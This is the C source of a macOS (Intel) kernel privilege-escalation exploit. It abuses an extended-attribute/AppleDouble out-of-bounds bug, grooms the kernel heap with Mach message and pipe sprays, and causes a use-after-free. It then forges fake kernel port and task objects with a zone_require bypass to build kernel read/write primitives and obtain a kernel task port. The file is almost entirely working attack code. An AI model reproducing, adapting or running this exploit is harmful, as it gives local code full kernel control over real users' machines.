//
//  exploit.c
//  exploit-1
//
//  Created by Quote on 2020/5/26.
//  Copyright Â© 2020 Quote. All rights reserved.
//

#include <stddef.h> // for offsetof
#include <stdio.h>
#include <stdlib.h>
#include <mach/mach.h>
#include <sys/xattr.h>
#include <assert.h>
#include <sys/time.h>
#include <errno.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>

#include "mycommon.h"
#include "utils.h"
#include "k_utils.h"
#include "kapi.h"
#include "k_offsets.h"
#include "user_kernel_alloc.h"
#include "ipc_port.h"

#include "apple_double.h"

// A convenience macro for accessing a field of a structure.
#define FIELD(object_, struct_, field_, type_)  \
        ( *(type_ *) ( ((uint8_t *) object_) + OFFSET(struct_, field_) ) )

static char OSData_holedata[0x41000 - 0x800]; // 65-page
static uint32_t OSData_holesize = sizeof(OSData_holedata);

int *pipefds;
void *pipe_buffer;
size_t pipe_buffer_size = 0x10000; // from 10.15?
kptr_t pipe_base;

uint32_t surface_key1 = '1yek';
uint32_t surface_key2 = '2yek';

size_t size_8PG  = 32 * KB;
size_t size_16PG = 64 * KB;

static uint64_t xattr_op_time;
static pthread_t th_overfree;
// TODO ugly
static volatile int oob_swap_started;
static volatile int overfree_done;
static volatile int thread_started;

struct thread_args_s {
    mach_port_t corrupted_kmsg_port;
    mach_port_t placeholder_8PG; // out
};
struct thread_args_s th_args;

static void *thread_overfree(void *args)
{
    int ret;
    char *fake_data = malloc(size_8PG);
    char *ool_data = malloc(size_8PG);

    memset_pattern4(fake_data, "fake", size_8PG);
    memset(ool_data, 0, size_8PG);
    *(uint64_t *)ool_data = g_exp.fake_port_address;

    thread_started = 1;
    while (!oob_swap_started) {
        ;
    }

    // 1/3 time, hope that oob-swap happened
    uint64_t op_time = xattr_op_time * 1 / 3;
    struct timespec tp;
    tp.tv_sec = op_time / (1000 * 1000 * 1000);
    tp.tv_nsec = op_time % (1000 * 1000 * 1000);
    do {
        ret = nanosleep(&tp, &tp);
    } while (ret && errno == EINTR);

    // heap memory status
    //
    // -----+-----------------+-------------+------------------+------------+---------+-----
    //  ... | xattrinfo (16p) |  kmsg (8p)  |  ool ports (8p)  | kmsg (19p) | kobject | ...
    // -----+-----------------+-------------+------------------+------------+---------+-----
    //                        |--- fake ikm_size (16p) ------->|

    // kmsg size has been modified to 64KB
    mach_port_destroy(mach_task_self(), th_args.corrupted_kmsg_port);

    // heap memory status
    //                         [ kmsg (8p) ] [ ool ports (8p) ]
    // -----+-----------------v-------------v------------------v------------+---------+-----
    //  ... | xattrinfo (16p) |       ~~~ freed ~~~            | kmsg (19p) | kobject | ...
    // -----+-----------------+-------------+------------------+------------+---------+-----
    //                        |--- fake ikm_size (16p) ------->|

    // fill the 64KB hole
    ipc_kmsg_kalloc_with_data(th_args.placeholder_8PG, fake_data, size_8PG);
    OSData_kmem_alloc(surface_key1, ool_data, size_8PG, OSData_holedata, OSData_holesize);

    // heap memory status
    //                                UAF -> [ ool ports (8p) ]
    // -----+-----------------+-------------+------------------+------------+---------+-----
    //  ... | xattrinfo (16p) | kmsg (8p)   | OSData bytes(8p) | kmsg (19p) | kobject | ...
    // -----+-----------------+-------------+------------------+------------+---------+-----

    overfree_done = 1;
    util_msleep(1000);
    pthread_exit(NULL);
}

static void read_pipe()
{
    size_t read_size = pipe_buffer_size - 1;
    ssize_t count = read(pipefds[0], pipe_buffer, read_size);
    if (count == read_size) {
        return;
    } else if (count == -1) {
        perror("read_pipe");
        util_error("could not read pipe buffer");
    } else if (count == 0) {
        util_error("pipe is empty");
    } else {
        util_error("partial read %zu of %zu bytes", count, read_size);
    }
    fail(__FUNCTION__);
}

static void write_pipe()
{
    size_t write_size = pipe_buffer_size - 1;
    ssize_t count = write(pipefds[1], pipe_buffer, write_size);
    if (count == write_size) {
        return;
    } else if (count < 0) {
        util_error("could not write pipe buffer");
    } else if (count == 0) {
        util_error("pipe is full");
    } else {
        util_error("partial write %zu of %zu bytes", count, write_size);
    }
    fail(__FUNCTION__);
}

void exploit(void)
{
    bool ok;
    int err;

    printf("[>] %s\n", __func__);
    sys_init();
    fail_if(g_exp.pagesize != 4 * KB, "only works on intel mac");
    kernel_offsets_init();
    g_exp.zone_ipc_ports = 45;
    g_exp.zone_tasks = 60;

    create_xattr_template();

    size_t pipe_count = 1;
    pipefds = create_pipes(&pipe_count);
    pipe_buffer = (char *)malloc(pipe_buffer_size);
    memset_pattern4(pipe_buffer, "pipe", pipe_buffer_size);

    void *kmsg_data = malloc(size_16PG * 2);
    memset_pattern4(kmsg_data, "kmsg", size_16PG * 2);
    void *ool_data = malloc(size_8PG);
    memset_pattern4(ool_data, "ool ", size_8PG);

    // 2. Initialize IOSurface.
    ok = IOSurface_init();
    assert(ok == true);

    // 4. Allocate 200 holding ports. Only about 29 will be used.
    struct holding_port_array holding_ports = holding_ports_create(200);
    struct holding_port_array all_holding_ports = holding_ports;

    // 10. Allocate 120 MB of 7-page kalloc allocations for a kalloc fragmentation. Put at most
    // 10 MB in each port. We want to fill the kalloc_map and start allocating from the
    // kernel_map near the middle of this spray.
    //
    // --#==============#=================+===+===+===+===#---+---+---+---+---+---+---+--------
    //   |  zalloc map  |     kalloc map  | 7 | 7 | 7 | 7 | 7 | 7 | 7 | 7 | 7 | 7 | 7 |
    // --#==============#=================+===+===+===+===#---+---+---+---+---+---+---+--------
    struct ipc_kmsg_kalloc_fragmentation_spray fragmentation_spray;
    ipc_kmsg_kalloc_fragmentation_spray_(&fragmentation_spray,
            7 * g_exp.pagesize, 512 * MB, 10 * MB, &holding_ports);

    // 11. Free 30 MB of the fragmentation spray from each end. This should create enough free
    // space in both the kalloc_map and the kernel_map to satisfy most allocations smaller than
    // 8 pages.
    //
    // --#==============#=================+===+===+===+===#---+---+---+---+---+---+---+--------
    //   |  zalloc map  |     kalloc map  | 7 |   | 7 |   | 7 | 7 | 7 |   | 7 |   | 7 |
    // --#==============#=================+===+===+===+===#---+---+---+---+---+---+---+--------
    ipc_kmsg_kalloc_fragmentation_spray_fragment_memory_(&fragmentation_spray, 30 * MB, +1);
    ipc_kmsg_kalloc_fragmentation_spray_fragment_memory_(&fragmentation_spray, 30 * MB, -1);

    // 12. Allocate 200 MB of 8-page kalloc allocations. This should be enough to fill any
    // remaining 8-page holes in the kalloc_map and kernel_map and start allocating from fresh
    // VA space in the kernel_map.
    //
    // -+---+---+---+---+----+-----------+----+----+----+----+---------+-----------------------
    //  |   | 7 |   | 7 | 8  | old alloc | 8  | 8  | 8  | 8  | 8  | 8  |     fresh VA space ->
    // -+---+---+---+---+----+-----------+----+----+----+----+---------+-----------------------
    struct ipc_kmsg_kalloc_spray kalloc_8page_spray;
    ipc_kmsg_kalloc_spray_(&kalloc_8page_spray,
            NULL, 8 * g_exp.pagesize, 200 * MB, 0, &holding_ports);

    mach_port_t placeholder_16PG = holding_port_pop(&holding_ports);
    ipc_kmsg_kalloc_with_data(placeholder_16PG, kmsg_data, size_16PG);

    // 18 17-page blocks
    mach_port_t spray_0x11_ports[18];
    for (int i = 0; i < arrayn(spray_0x11_ports); i++) {
        spray_0x11_ports[i] = holding_port_pop(&holding_ports);
        ipc_kmsg_kalloc_with_data(spray_0x11_ports[i], kmsg_data, 0x11 * g_exp.pagesize);
    }

    pipe_spray(pipefds, 1, pipe_buffer, pipe_buffer_size, NULL);

    // heap memory status
    //       [xattrinfo (16p)]
    // -----+-----------------+------------+------------+------------+-------+------------+------------+-----
    //  ... |   kmsg (16p)    | kmsg (17p) | kmsg (17p) | kmsg (17p) |  ...  | kmsg (17p) | pipe (16p) | ...
    // -----+-----------------+------------+------------+------------+-------+------------+------------+-----

    // enlarge time window
    struct ipc_kmsg_kalloc_spray oob_read_spray;
    ipc_kmsg_kalloc_spray_(&oob_read_spray,
            NULL, size_16PG, 32 * MB, 0, &holding_ports);

    // dump kmsg memory
    mach_port_destroy(mach_task_self(), placeholder_16PG);
    placeholder_16PG = holding_port_grab(&holding_ports); // stay here

    struct timeval tv1, tv2;
    gettimeofday(&tv1, NULL);
    // dump 64MB data
    err = setxattr(MOUNT_DIR "1.txt", "xattr4", "\xf8\xff\x00\x04", 4, 0, XATTR_REPLACE);
    gettimeofday(&tv2, NULL);
    if (err) {
        perror("setxattr");
    }
    ipc_kmsg_kalloc_with_data(placeholder_16PG, kmsg_data, size_16PG);
    // nano seconds
    xattr_op_time = ((tv2.tv_sec * 1000 * 1000 + tv2.tv_usec) -
                     (tv1.tv_sec * 1000 * 1000 + tv1.tv_usec))* 1000;
    util_info("%llu nano seconds passed", xattr_op_time);

    int align_64KB_index = -1;
    // kmsg->ikm_next = kmsg;
    uintptr_t kmsg_addr = -1; // make clang happy
    uintptr_t ikm_next;

    FILE *fp = fopen(MOUNT_DIR "._1.txt", "rb");
    for (int i = 0; i < 18; i++ ) {
        fseek(fp, size_16PG + i * 0x11 * g_exp.pagesize + 8, SEEK_SET);
        fread(&ikm_next, sizeof(ikm_next), 1, fp);
        util_info("ikm_next %#lx", ikm_next);
        if ((ikm_next & 0xFFFF) == 0x0000) {
            kmsg_addr = ikm_next;
            align_64KB_index = i;
            break;
        }
    }
    fclose(fp);
    util_info("align_64KB_index: %d", align_64KB_index);
    if (align_64KB_index == -1) {
        fail("Can not find 64KB aligned 0x11 pages");
    }
    pipe_base = kmsg_addr + (arrayn(spray_0x11_ports) - align_64KB_index) * 0x11 * g_exp.pagesize;
    util_info("pipe_base %#llx", pipe_base);

    // determine fake port & fake task address
    g_exp.fake_port_page_addr = pipe_base;
    g_exp.fake_port_address = g_exp.fake_port_page_addr + 0x100;
    g_exp.fake_port_page = pipe_buffer;
    g_exp.fake_port_data = g_exp.fake_port_page + 0x100;

    g_exp.fake_task_page_addr = g_exp.fake_port_page_addr + g_exp.pagesize;
    g_exp.fake_task_address = g_exp.fake_task_page_addr + 0x100;
    g_exp.fake_task_page = g_exp.fake_port_page + g_exp.pagesize;
    g_exp.fake_task_data = g_exp.fake_task_page + 0x100;

    placeholder_16PG = holding_port_pop(&holding_ports);
    mach_port_t placeholder_8PG = holding_port_pop(&holding_ports);
    mach_port_t placeholder_0x13_pages = holding_port_grab(&holding_ports); // stay here
    for (int i = 0; i < 3; i++) {
        mach_port_destroy(mach_task_self(), spray_0x11_ports[align_64KB_index + i]);
        spray_0x11_ports[align_64KB_index + i] = MACH_PORT_DEAD;
    }

    // fill the [17p, 17p, 17p] hole
    ipc_kmsg_kalloc_with_data(placeholder_16PG, kmsg_data, size_16PG);
    ipc_kmsg_kalloc_with_data(placeholder_8PG, kmsg_data, size_8PG);
    // allocate ool buffer which we'll also UAF
    mach_port_t ool_message_port = holding_port_pop(&holding_ports);
    spray_ool_pages(ool_message_port, size_8PG, NULL, 0, MACH_MSG_TYPE_MOVE_RECEIVE);
    ipc_kmsg_kalloc_with_data(placeholder_0x13_pages, kmsg_data, 0x13 * g_exp.pagesize);

    {
        th_args.corrupted_kmsg_port = placeholder_8PG;
        th_args.placeholder_8PG = holding_port_grab(&holding_ports);
        err = pthread_create(&th_overfree, NULL, thread_overfree, NULL);
        fail_if(err, "return code from pthread_create() is %d\n", err);
        while (!thread_started) {
            util_msleep(100); // 0.1s
        }
    }

    mach_port_destroy(mach_task_self(), placeholder_16PG);
    placeholder_16PG = holding_port_grab(&holding_ports); // stay here

    apple_double_header_t *header = &attrinfo.attrhdr->appledouble;
    // (64*1024 - 0x1A) / 12 => 5459
    // (64*1024 - 0x1A) % 12 => 2
    header->numEntries = 5460;
    attrinfo.attrhdr->data_start = 0x0400fff8;

    // heap memory status
    //       [xattrinfo (16p)]
    // -----v-----------------v-------------+------------------+------------+---------+-----
    //  ... |   ~~~ hole ~~~  |  kmsg (8p)  |  ool ports (8p)  | kmsg (19p) | kobject | ...
    // -----+-----------------+-------------+------------------+------------+---------+-----

    // notify wait_for thread
    oob_swap_started = 1;

    // oob-swap
    err = setxattr(MOUNT_DIR "2.txt", "xattr76", &header->numEntries, 76, 0, XATTR_REPLACE);
    if (err) {
        perror("setxattr");
    }

    while (!overfree_done) {
        ;
    }
    ipc_kmsg_kalloc_with_data(placeholder_16PG, kmsg_data, size_16PG);

    // heap memory status
    //       [xattrinfo (16p)]        UAF -> [ ool ports (8p) ]
    // -----+-----------------+-------------+------------------+------------+---------+-----
    //  ... |   kmsg (16p)    | kmsg (8p)   | OSData bytes(8p) | kmsg (19p) | kobject | ...
    // -----+-----------------+-------------+------------------+------------+---------+-----

    void (^setup_fake_port_task)(void) = ^void (void) {
        // setup fake port & fake task
        memset(g_exp.fake_port_page, 0, g_exp.pagesize);
        memset(g_exp.fake_task_page, 0, g_exp.pagesize);

        // zone_require bypass
        *(uint16_t *)(g_exp.fake_port_page + 0x16) = g_exp.zone_ipc_ports;
        *(uint16_t *)(g_exp.fake_task_page + 0x16) = g_exp.zone_tasks;

        FIELD(g_exp.fake_port_data, ipc_port, ip_bits,    uint32_t) = io_makebits(1, IOT_PORT, IKOT_NONE);
    };
    read_pipe();
    setup_fake_port_task();
    write_pipe();

    // receive back the fake ports
    struct ool_msg *ool = (struct ool_msg *)receive_message(ool_message_port, sizeof(struct ool_msg) + 0x1000);
    OSData_kmem_alloc(surface_key2, ool_data, size_8PG, OSData_holedata, OSData_holesize);

    // 23. Reallocating the OOL ports was our last act of kernel heap manipulation, so go ahead
    // and destroy all the holding ports. This won't destroy the ool_ports_msg_holding_port.
    holding_ports_destroy(all_holding_ports);
    for (int i = 0; i < arrayn(spray_0x11_ports); i++) {
        mach_port_destroy(mach_task_self(), spray_0x11_ports[i]);
    }

    mach_port_t fake_port = ((mach_port_t *)ool->ool_ports.address)[0];
    printf("[+] fake_port: %#x\n", fake_port);
    g_exp.fake_port = fake_port;
    free(ool);

    // 26. Give ourselves a send right to the port.
    mach_port_insert_send_right(fake_port);

    // 27. Grab current ipc_space
    read_pipe();
    kptr_t ip_receiver = FIELD(g_exp.fake_port_data, ipc_port, ip_receiver, uint64_t);
    g_exp.self_ipc_space = ip_receiver;
    write_pipe();
    util_info("self_ipc_space: %#llx", g_exp.self_ipc_space);

    // 28. Construct a kernel memory read primitive using the fake port.
    stage0_read32 = ^uint32_t (kptr_t address) {
        // Do a read to make the pipe available for a write.
        read_pipe();
        // Now rewrite the port as a fake task port pointing to our fake task.
        uint64_t fake_proc_address = address - OFFSET(proc, p_pid);
        FIELD(g_exp.fake_task_data, task,     ref_count,  uint32_t) = 2;
        FIELD(g_exp.fake_task_data, task,     bsd_info,   uint64_t) = fake_proc_address;
        FIELD(g_exp.fake_port_data, ipc_port, ip_bits,    uint32_t) = io_makebits(1, IOT_PORT, IKOT_TASK|IO_BITS_KOBJECT);
        FIELD(g_exp.fake_port_data, ipc_port, ip_kobject, uint64_t) = g_exp.fake_task_address;
        write_pipe();
        int32_t pid = -1;
        kern_return_t kr = pid_for_task(g_exp.fake_port, &pid);
        if (kr != KERN_SUCCESS) {
            fail("Failed to read address %#llx", address);
        }
        return pid;
    };

    stage0_read64 = ^uint64_t (uint64_t address) {
        union {
            uint32_t value32[2];
            uint64_t value64;
        } u;
        u.value32[0] = stage0_read32(address);
        u.value32[1] = stage0_read32(address + 4);
        return u.value64;
    };

    stage0_read_kptr = ^kptr_t (kptr_t addr) {
        uint64_t v = stage0_read64(addr);
        return (kptr_t)v;
    };

    // 29. Grab our task port pointer.
    g_exp.self_task = stage0_read64(g_exp.self_ipc_space + OFFSET(ipc_space, is_task));

    // 30. Walk the proc list until we find the kernproc.
    g_exp.self_proc = stage0_read64(g_exp.self_task + OFFSET(task, bsd_info));
    g_exp.kernel_proc = kproc_find_pid0(g_exp.self_proc);

    // 31. Grab the kernel_task, kernel_map, and ipc_space_kernel.
    g_exp.kernel_task = stage0_read64(g_exp.kernel_proc + OFFSET(proc, task));
    g_exp.kernel_map = stage0_read64(g_exp.kernel_task + OFFSET(task, map));
    uint64_t current_task_port = stage0_read64(g_exp.self_task + OFFSET(task, itk_sself));
    uint64_t ipc_space_kernel = stage0_read64(current_task_port + OFFSET(ipc_port, ip_receiver));

    util_info("kernel_task: %#llx", g_exp.kernel_task);
    util_info("kernel_map: %#llx", g_exp.kernel_map);
    util_info("current_task_port: %#llx", current_task_port);
    util_info("ipc_space_kernel: %#llx", ipc_space_kernel);

    // 32. Convert our fake port into a fake kernel_task.
    void (^build_fake_kernel_task)(void *) = ^(void *fake_task) {
        FIELD(fake_task, task, lck_mtx_data, uint64_t) = 0;
        FIELD(fake_task, task, ref_count,    uint32_t) = 4;
        FIELD(fake_task, task, active,       uint32_t) = 1;
        FIELD(fake_task, task, map,          uint64_t) = g_exp.kernel_map;
    };
    void (^build_fake_kernel_port)(void *, uint64_t) = ^(void *fake_port, uint64_t fake_task_address) {
        FIELD(fake_port, ipc_port, ip_bits,       uint32_t) = io_makebits(1, IOT_PORT, IKOT_TASK|IO_BITS_KOBJECT);
        FIELD(fake_port, ipc_port, ip_references, uint32_t) = 4;
        FIELD(fake_port, ipc_port, ip_receiver,   uint64_t) = ipc_space_kernel;
        FIELD(fake_port, ipc_port, ip_kobject,    uint64_t) = fake_task_address;
        FIELD(fake_port, ipc_port, ip_mscount,    uint32_t) = 1;
        FIELD(fake_port, ipc_port, ip_srights,    uint32_t) = 1;
    };
    read_pipe();
    build_fake_kernel_task(g_exp.fake_task_data);
    build_fake_kernel_port(g_exp.fake_port_data, g_exp.fake_task_address);
    write_pipe();
    // Now we can use our fake_port as a kernel task port.
    kernel_task_port = fake_port;

    // 33. Construct a better kernel task port.
    uint64_t fake_kernel_task_page = kapi_vm_allocate(2 * g_exp.pagesize);
    if (fake_kernel_task_page == 0) {
        fail("Could not allocate fake kernel task");
    }
    util_info("fake_kernel_task_page: %#llx", fake_kernel_task_page);
    uint64_t fake_kernel_task_port_page = fake_kernel_task_page + g_exp.pagesize;
    size_t page_buffer_size = g_exp.pagesize / 4;
    uint8_t *page_buffer = (uint8_t *)malloc(page_buffer_size);
    // Build the fake kernel_task.
    memset(page_buffer, 0, page_buffer_size);
    *(uint16_t *) (page_buffer + 0x16) = g_exp.zone_tasks;
    uint64_t fake_kernel_task_address = fake_kernel_task_page + 0x100;
    uint8_t *fake_kernel_task_data = page_buffer + 0x100;
    build_fake_kernel_task(fake_kernel_task_data);
    kapi_write(fake_kernel_task_page, page_buffer, page_buffer_size);
    // Build the fake kernel_task port.
    memset(page_buffer, 0, page_buffer_size);
    *(uint16_t *) (page_buffer + 0x16) = g_exp.zone_ipc_ports;
    uint64_t fake_kernel_task_port_address = fake_kernel_task_port_page + 0x100;
    uint8_t *fake_kernel_task_port_data = page_buffer + 0x100;
    build_fake_kernel_port(fake_kernel_task_port_data, fake_kernel_task_address);
    kapi_write(fake_kernel_task_port_page, page_buffer, page_buffer_size);

    // 34. Look up our current fake port and replace it with the new fake kernel_task port.
    uint64_t fake_port_entry = ipc_entry_lookup(fake_port);
    // Drop our receive right so that we now only have a send right.
    uint32_t ie_bits = kapi_read32(fake_port_entry + OFFSET(ipc_entry, ie_bits));
    ie_bits &= ~MACH_PORT_TYPE_RECEIVE;
    kapi_write32(fake_port_entry + OFFSET(ipc_entry, ie_bits), ie_bits);
    // Change the object to point to the new fake kernel task port. This write has to be
    // atomic with respect to the write primitive itself (i.e. it can't be composed of two
    // separate 32-bit writes).
    kapi_write64(fake_port_entry + OFFSET(ipc_entry, ie_object),
            fake_kernel_task_port_address);

    // then use the better kernel task port
    kptr_t new_page = kapi_vm_allocate(g_exp.pagesize);
    if (new_page) {
        uint32_t v1, v2 = 0xaabbccdd;
        v1 = kapi_read32(new_page);
        kapi_write32(new_page, v2);
        v2 = kapi_read32(new_page);
        util_info("tfp0 test - %#llx: %#x -> %#x", new_page, v1, v2);
    }
    else {
        fail("new tfp0");
    }

    util_info("");
    util_info("TODO use new tfp0 to do useful things");
    util_info("");

    fail("done everything, Ctrl-C to panic");

    // TODO fix kheap by yourself
    pipe_close(pipefds);
    free(pipefds);

    printf("[<] %s\n", __func__);
}
